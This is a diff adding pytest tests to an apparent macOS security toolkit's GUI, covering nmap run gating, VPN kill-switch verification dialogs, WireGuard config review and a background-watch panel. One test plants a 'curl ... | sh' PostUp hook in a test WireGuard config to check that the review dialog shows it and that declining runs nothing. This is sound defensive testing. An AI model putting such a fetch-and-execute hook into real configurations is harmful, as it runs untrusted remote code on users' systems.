@@ -876,6 +876,13 @@ class TestWorkspaceLayoutRegressions:
         panel = getattr(win, panel_name)
         assert not [b for b in panel.findChildren(QPushButton) if b.text() == "Help"]
 
+    def test_nmap_run_tooltip_states_the_program_and_confirmation_gates(self, win):
+        # The Run button never starts a scan on its own: a Program entry and a
+        # Yes in the confirmation (default No) come first.
+        tip = win.bug_bounty_panel.nmap_run_btn.toolTip()
+        assert "Program" in tip and "confirmation" in tip and "default No" in tip
+        assert "immediately" not in tip
+
     @pytest.mark.parametrize("panel_name,primary,stop", [
         ("osint_panel", "analyse_btn", "stop_btn"),
         ("osint_heavy_panel", "investigate_btn", "stop_btn"),
@@ -1344,10 +1351,11 @@ class FakeVpnConnectionWorker(QObject):
     error_signal = Signal(str)
     instances = []
 
-    def __init__(self, action, profile):
+    def __init__(self, action, profile, confirmed=None):
         super().__init__()
         self.action = action
         self.profile = profile
+        self.confirmed = confirmed
         self.started = False
         FakeVpnConnectionWorker.instances.append(self)
 
@@ -1682,6 +1690,14 @@ class TestTracePanel:
         assert "target stays on this Mac" in activity
         assert "No websites or public databases are contacted" in activity
         assert "Google dorks" in activity
+
+    def test_activity_tracker_does_not_claim_scope_was_confirmed(self, trace):
+        # Only the target's format is checked; nothing confirms authorisation.
+        trace.provider_box.setCurrentText("ollama")
+        trace.analyse()
+        activity = trace.activity_box.toPlainText()
+        assert "Target format accepted" in activity
+        assert "Scope confirmed" not in activity
 
     def test_live_domain_research_requires_explicit_confirmation(
             self, trace, monkeypatch):
@@ -3356,7 +3372,10 @@ def tunnel(qapp, monkeypatch, tmp_path):
     confs = tmp_path / "wireguard"
     confs.mkdir()
     for name in ("wg0", "wg1", "wg2", "wg3", "wgtest"):
-        (confs / f"{name}.conf").write_text("[Interface]\n")
+        # Reviewed like any imported config now, so it must be a real one.
+        (confs / f"{name}.conf").write_text(
+            "[Interface]\nPrivateKey = x\nAddress = 10.8.0.2/32\n"
+            "[Peer]\nPublicKey = y\nEndpoint = 203.0.113.7:51820\nAllowedIPs = 0.0.0.0/0\n")
     monkeypatch.setattr(vpn_execution, "WG_CONFIG_DIRS", (str(confs),))
     from ui.panels.vpn import VpnPanel
     from services.vpn_diagnostics import VpnProfileCatalog
@@ -3385,6 +3404,7 @@ def tunnel(qapp, monkeypatch, tmp_path):
     from services import vpn_connection, vpn_execution
     monkeypatch.setattr(vpn_connection.wireguard_manager, "is_wg_quick_available", lambda: True)
     monkeypatch.setattr(vpn_execution, "_killswitch_armed", lambda: False)
+    monkeypatch.setattr(vpn_connection, "killswitch_status_text", lambda: None)
     monkeypatch.setattr(vpn_execution, "_default_probe", lambda: {
         "wireguard": lambda name: {"up": False, "device": None},
         "openvpn_running": lambda: False,
@@ -3413,6 +3433,86 @@ class TestTunnelPanel:
         assert tunnel.tabs.tabText(7) == "Servers"
         assert tunnel.tabs.tabText(8) == "VPN Apps"
 
+    def test_verify_button_starts_a_verify_worker_without_a_confirmation(self, tunnel, monkeypatch):
+        from PySide6.QtWidgets import QMessageBox
+        from services import vpn_connection
+        # pf exists only on macOS; without this Linux CI opens the modal "needs pf" box and hangs.
+        monkeypatch.setattr(vpn_connection, "killswitch_supported", lambda: True)
+        monkeypatch.setattr(QMessageBox, "question",
+                            staticmethod(lambda *a, **k: (_ for _ in ()).throw(AssertionError("asked"))))
+        FakeVpnConnectionWorker.instances.clear()
+        assert tunnel.verify_ks_btn.text() == "Verify"
+        tunnel.verify_ks_btn.click()
+        (worker,) = FakeVpnConnectionWorker.instances
+        assert worker.action == "verify" and worker.started
+        assert tunnel.verify_ks_btn.isEnabled() is False and tunnel.arm_ks_btn.isEnabled() is False
+
+    def test_verify_result_sets_the_label_and_reenables_the_buttons(self, tunnel, monkeypatch):
+        from services import vpn_connection
+        monkeypatch.setattr(vpn_connection, "killswitch_supported", lambda: True)
+        tunnel.verify_ks_btn.click()
+        tunnel._on_killswitch_finished({"success": True, "output": "Verified armed (10:00): x",
+                                        "verify_state": "verified_armed"})
+        assert tunnel.kill_switch_status_label.text() == "Verified armed (10:00): x"
+        assert tunnel.verify_ks_btn.isEnabled() and tunnel.arm_ks_btn.isEnabled()
+
+    def test_a_failed_verify_says_could_not_verify(self, tunnel):
+        tunnel._on_killswitch_finished({"success": False, "error": "Could not verify: Cancelled.",
+                                        "verify_state": "unknown"})
+        assert tunnel.kill_switch_status_label.text().startswith("Could not verify")
+
+    def test_verified_empty_offers_to_clear_the_record_and_default_is_no(self, tunnel, monkeypatch):
+        from PySide6.QtWidgets import QMessageBox
+        from services import vpn_connection
+        asked, cleared = [], []
+        monkeypatch.setattr(QMessageBox, "question", staticmethod(
+            lambda parent, title, text, buttons, default: asked.append(default) or QMessageBox.Yes))
+        monkeypatch.setattr(vpn_connection, "clear_killswitch_record", lambda: cleared.append(1) or True)
+        tunnel._on_killswitch_finished({"success": True, "output": "Not armed: no rules loaded.",
+                                        "verify_state": "verified_empty"})
+        assert asked == [QMessageBox.No] and cleared == [1]
+        assert "record cleared" in tunnel.kill_switch_status_label.text().lower()
+
+    def test_inert_rules_offer_disarm_not_clearing_the_record(self, tunnel, monkeypatch):
+        from PySide6.QtWidgets import QMessageBox
+        from services import vpn_connection
+        asked, cleared = [], []
+        monkeypatch.setattr(QMessageBox, "question", staticmethod(
+            lambda parent, title, text, buttons, default: asked.append((text, default)) or QMessageBox.Yes))
+        monkeypatch.setattr(vpn_connection, "clear_killswitch_record", lambda: cleared.append(1) or True)
+        monkeypatch.setattr(vpn_connection, "killswitch_supported", lambda: True)
+        FakeVpnConnectionWorker.instances.clear()
+        tunnel._on_killswitch_finished({"success": True, "output": "Not enforcing: pf is switched off.",
+                                        "verify_state": "verified_inert"})
+        (text, default), = asked
+        assert default == QMessageBox.No and "disarm" in text.lower() and "clear" not in text.lower()
+        assert cleared == []
+        assert [w.action for w in FakeVpnConnectionWorker.instances] == ["disarm"]
+
+    def test_inert_rules_declined_starts_nothing(self, tunnel, monkeypatch):
+        from PySide6.QtWidgets import QMessageBox
+        monkeypatch.setattr(QMessageBox, "question", staticmethod(lambda *a, **k: QMessageBox.No))
+        FakeVpnConnectionWorker.instances.clear()
+        tunnel._on_killswitch_finished({"success": True, "output": "x", "verify_state": "verified_inert"})
+        assert FakeVpnConnectionWorker.instances == []
+
+    def test_verified_armed_and_blocking_offer_nothing(self, tunnel, monkeypatch):
+        from PySide6.QtWidgets import QMessageBox
+        monkeypatch.setattr(QMessageBox, "question", staticmethod(
+            lambda *a, **k: (_ for _ in ()).throw(AssertionError("asked"))))
+        for st in ("verified_armed", "verified_blocking"):
+            tunnel._on_killswitch_finished({"success": True, "output": "x", "verify_state": st})
+
+    def test_declining_the_clear_keeps_the_record(self, tunnel, monkeypatch):
+        from PySide6.QtWidgets import QMessageBox
+        from services import vpn_connection
+        cleared = []
+        monkeypatch.setattr(QMessageBox, "question", staticmethod(lambda *a, **k: QMessageBox.No))
+        monkeypatch.setattr(vpn_connection, "clear_killswitch_record", lambda: cleared.append(1) or True)
+        tunnel._on_killswitch_finished({"success": True, "output": "Not armed: no rules loaded.",
+                                        "verify_state": "verified_empty"})
+        assert cleared == []
+
     def test_connecting_a_real_profile_starts_the_connection_worker(self, tunnel, monkeypatch):
         from PySide6.QtWidgets import QMessageBox
         monkeypatch.setattr(QMessageBox, "question",
@@ -3425,6 +3525,43 @@ class TestTunnelPanel:
         assert len(FakeVpnConnectionWorker.instances) == 1
         assert FakeVpnConnectionWorker.instances[0].action == "connect"
         assert FakeVpnConnectionWorker.instances[0].profile["interface"] == "wg0"
+
+    def test_the_worker_gets_the_review_the_user_confirmed(self, tunnel, monkeypatch):
+        from PySide6.QtWidgets import QMessageBox
+        from services.vpn_execution import ExecutionReview
+        monkeypatch.setattr(QMessageBox, "question",
+                            staticmethod(lambda *a, **k: QMessageBox.Yes))
+        tunnel.connect_profile_box.clear()
+        tunnel.connect_profile_box.addItem("VPS", {
+            "name": "VPS", "protocol": "WireGuard",
+            "endpoint": "203.0.113.7", "interface": "wg0"})
+        tunnel.connect_vpn()
+        confirmed = FakeVpnConnectionWorker.instances[0].confirmed
+        assert isinstance(confirmed, ExecutionReview)
+        # An interface-only profile now runs the reviewed file, named by absolute path.
+        assert confirmed.action == "connect" and confirmed.interface == "wg0"
+        assert os.path.isabs(confirmed.target) and confirmed.target.endswith("wg0.conf")
+
+    def test_a_long_hook_is_shown_whole_in_the_dialog_detail(self, tunnel, monkeypatch, tmp_path):
+        from PySide6.QtWidgets import QMessageBox
+        command = "curl -s http://203.0.113.9/" + "a" * 500 + " | sh"
+        conf = tmp_path / "wgh.conf"
+        conf.write_text(
+            "[Interface]\nPrivateKey = x\nAddress = 10.8.0.2/32\n"
+            f"PostUp = {command}\n"
+            "[Peer]\nPublicKey = y\nEndpoint = 203.0.113.7:51820\nAllowedIPs = 0.0.0.0/0\n")
+        boxes = []
+        monkeypatch.setattr(QMessageBox, "exec", lambda box: (
+            boxes.append((box.text(), box.detailedText())) or QMessageBox.No))
+        tunnel.connect_profile_box.clear()
+        tunnel.connect_profile_box.addItem("Hooked", {
+            "name": "Hooked", "protocol": "WireGuard", "endpoint": "203.0.113.7",
+            "interface": "wgh", "config_path": str(conf)})
+        tunnel.connect_vpn()
+        assert len(boxes) == 1 and FakeVpnConnectionWorker.instances == []
+        text, detail = boxes[0]
+        assert command not in text and "more characters" in text
+        assert command in detail
 
     def test_the_confirmation_shows_the_review_and_defaults_to_no(self, tunnel, monkeypatch):
         from PySide6.QtWidgets import QMessageBox
@@ -3441,7 +3578,7 @@ class TestTunnelPanel:
         tunnel.connect_vpn()
         assert FakeVpnConnectionWorker.instances == []
         (title, text, default), = asked
-        assert "Target: wg0" in text and "wg-quick" in text and "To undo" in text
+        assert "wg0.conf" in text and "Target: " in text and "wg-quick" in text and "To undo" in text
         assert default == QMessageBox.No
         assert tunnel.tabs.currentWidget() is tunnel.execution_view
 
@@ -3589,6 +3726,42 @@ class TestTunnelPanel:
         assert FakeVpnConnectionWorker.instances == []
         assert entries() == []
 
+    def _risky_disconnect(self, tunnel, monkeypatch, tmp_path, answers):
+        from PySide6.QtWidgets import QMessageBox
+        script = tmp_path / "down.sh"
+        script.write_text("#!/bin/sh\n")
+        conf = tmp_path / "wgd.conf"
+        conf.write_text(
+            "[Interface]\nPrivateKey = x\nAddress = 10.8.0.2/32\n"
+            f"PostDown = {script}\n"
+            "[Peer]\nPublicKey = y\nEndpoint = 203.0.113.7:51820\nAllowedIPs = 0.0.0.0/0\n")
+        titles = []
+        monkeypatch.setattr(QMessageBox, "question",
+                            staticmethod(lambda *a, **k: QMessageBox.Yes))
+        monkeypatch.setattr(QMessageBox, "warning", staticmethod(
+            lambda *a, **k: titles.append(a[1]) or answers[len(titles) - 1]))
+        tunnel.connect_profile_box.clear()
+        tunnel.connect_profile_box.addItem("Risky", {
+            "name": "Risky", "protocol": "WireGuard", "endpoint": "203.0.113.7",
+            "interface": "wgd", "config_path": str(conf)})
+        tunnel.disconnect_vpn()
+        return titles
+
+    def test_a_disconnect_with_unreviewable_hooks_asks_to_disconnect_anyway(
+            self, tunnel, monkeypatch, tmp_path):
+        from PySide6.QtWidgets import QMessageBox
+        titles = self._risky_disconnect(tunnel, monkeypatch, tmp_path,
+                                        [QMessageBox.Yes, QMessageBox.Yes])
+        assert titles[-1] == "Disconnect anyway?"
+        worker, = FakeVpnConnectionWorker.instances
+        assert worker.action == "disconnect" and worker.confirmed.risks
+
+    def test_declining_disconnect_anyway_runs_nothing(self, tunnel, monkeypatch, tmp_path):
+        from PySide6.QtWidgets import QMessageBox
+        titles = self._risky_disconnect(tunnel, monkeypatch, tmp_path,
+                                        [QMessageBox.Yes, QMessageBox.No])
+        assert titles[-1] == "Disconnect anyway?" and FakeVpnConnectionWorker.instances == []
+
     def test_a_config_without_hooks_asks_once(self, tunnel, monkeypatch, tmp_path):
         from PySide6.QtWidgets import QMessageBox
         prompts = []
@@ -3686,6 +3859,21 @@ class TestTunnelPanel:
         assert FakeVpnConnectionWorker.instances == []
         assert entries() == []
         assert "declined" in tunnel.kill_switch_status_label.text()
+
+    def test_the_kill_switch_label_starts_from_the_real_status_not_a_static_text(
+            self, tunnel, monkeypatch):
+        from services import vpn_connection
+        from ui.panels.vpn import VpnPanel
+        monkeypatch.setattr(vpn_connection, "killswitch_status_text",
+                            lambda: "Recorded as armed (not verified) — only utun7 may carry traffic")
+        panel = VpnPanel(tunnel.host)
+        try:
+            assert "recorded as armed (not verified)" in panel.kill_switch_status_label.text().lower()
+        finally:
+            panel.shutdown()
+
+    def test_the_kill_switch_label_falls_back_when_status_is_unavailable(self, tunnel):
+        assert tunnel.kill_switch_status_label.text() == "Kill switch not armed."
 
     def test_kill_switch_result_updates_its_own_status(self, tunnel):
         tunnel._on_killswitch_finished({"success": True, "output": "Kill switch ARMED"})
@@ -4233,6 +4421,40 @@ class TestSentryPanel:
         assert FakeWorker.instances == []
         assert sentry_panel.run_btn.isEnabled() is True
         assert sentry_panel.stop_btn.isEnabled() is False
+
+    def test_the_panel_greys_install_in_a_packaged_build(self, sentry_panel, monkeypatch):
+        import ui.panels.sentry as sentry_module
+        monkeypatch.setattr(sentry_module.watchd, "status", lambda: {
+            "installed": False, "loaded": False, "interval": None, "frozen": True})
+        sentry_panel.refresh_watch_status()
+        assert sentry_panel.install_btn.isEnabled() is False
+        assert "packaged app" in sentry_panel.bg_status_label.text()
+        assert "running" not in sentry_panel.bg_status_label.text().lower()
+
+    def test_the_panel_offers_removal_of_a_leftover_plist_in_a_packaged_build(self, sentry_panel, monkeypatch):
+        import ui.panels.sentry as sentry_module
+        monkeypatch.setattr(sentry_module.watchd, "status", lambda: {
+            "installed": True, "loaded": True, "interval": 300, "frozen": True})
+        sentry_panel.refresh_watch_status()
+        text = sentry_panel.bg_status_label.text().lower()
+        assert "cannot run" in text and "remove" in text
+        assert sentry_panel.install_btn.isEnabled() is False
+
+    def test_the_panel_does_not_say_running_after_the_last_run_failed(self, sentry_panel, monkeypatch):
+        import ui.panels.sentry as sentry_module
+        monkeypatch.setattr(sentry_module.watchd, "status", lambda: {
+            "installed": True, "loaded": True, "interval": 300, "frozen": False,
+            "last_run": "failed", "last_exit_code": "78", "log": "/x/watch.log"})
+        sentry_panel.refresh_watch_status()
+        text = sentry_panel.bg_status_label.text().lower()
+        assert "last run failed" in text and "78" in text and "is running" not in text
+
+    def test_the_panel_shows_the_install_message_as_is(self, sentry_panel, monkeypatch):
+        import ui.panels.sentry as sentry_module
+        monkeypatch.setattr(sentry_module.watchd, "install", lambda interval: {
+            "ok": False, "verified": False, "message": "Background watch: load accepted, not verified."})
+        sentry_panel.install_background()
+        assert sentry_panel.status_label.text() == "Background watch: load accepted, not verified."
 
     def test_install_and_remove_background_call_launchd(self, sentry_panel, monkeypatch):
         import ui.panels.sentry as sentry_module
